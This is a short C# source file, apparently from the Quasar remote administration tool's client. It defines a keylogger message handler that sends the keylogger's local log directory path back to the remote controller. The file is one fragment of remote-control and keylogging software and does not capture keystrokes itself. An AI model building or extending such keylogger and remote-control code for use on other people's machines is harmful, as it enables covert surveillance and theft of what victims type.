using Quasar.Client.Config;
using Quasar.Common.Messages;
using Quasar.Common.Networking;

namespace Quasar.Client.Messages
{
    public class KeyloggerHandler : MessageProcessorBase<object>
    {
        public KeyloggerHandler() : base(false)
        {
            
        }

        public override bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
        }

        protected override void Dispose(bool disposing)
        {
            
        }
    }
}
